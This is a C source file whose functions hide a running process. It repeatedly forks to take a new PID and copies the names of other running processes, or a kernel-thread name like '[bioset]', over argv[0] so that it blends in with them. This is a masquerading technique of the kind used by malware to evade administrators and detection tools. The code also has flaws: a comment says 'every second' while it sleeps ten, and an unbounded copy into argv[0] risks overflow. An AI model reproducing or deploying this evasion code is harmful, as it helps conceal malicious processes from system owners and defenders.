/* Short program to change the process PID and process name of this executable file */
#include "header.h"

void changePID() {
	// fork process to create a new PID and exit out of the parent process
	pid_t pid = fork();
	if (pid == 0) {
		printf("New child created.\n");
	} else {
		exit(0);
	}
}

void changeProcessName(char *argv[]) {

	// Buffer to read lines 
	char temp[1024]; 
	// Buffer to store new process name 
	char processName[1028]; 

	char *ptr = NULL; 
	FILE *fp  = NULL; 

start: 
	memset(temp,'\0', sizeof(temp)); 
	memset(processName,'\0', sizeof(processName)); 

	// Store process names in a text file called 'processes.txt' 
	system("/bin/sh -c 'ps -aef > processes.txt'"); 

	// Open the file 'processes.txt' 
	fp = fopen("processes.txt", "r"); 

	if(NULL == fp) { 
		printf("ERROR: File opening failed.\n"); 
	} 

	// Get each line from file until done reading
	while(NULL != fgets(temp, sizeof(temp), fp)) { 
		//Search for any processes containing a '[' to copy that process name
		ptr = strchr(temp, '['); 

		if(NULL == ptr) {
			//Search for any processes containing '/' if '[' is not found 
			ptr = strchr(temp, '/'); 
		} 
		if(NULL != ptr) { 
			// Copy the process name to processName
			strcpy(processName, ptr);
		} 
		else { 
			// If no '[' or '/' are found, set process name to a default called '[bioset]'
			ptr = "[bioset]"; 
			strcpy(processName, ptr);             
		} 

		// Copy to arv[0] to change process name  
		strncpy(argv[0], processName, sizeof(processName)); 

		printf("Process name changed to: %s \n", processName); 

		// Changes name every second
		sleep(10); 

		// Reset process name to NULL  
		memset((processName),'\0', sizeof(processName)); 

		// Change PID of process
		changePID();
	} 

	fclose(fp);

	// Run the program indefinitely 
	//goto start; 
}

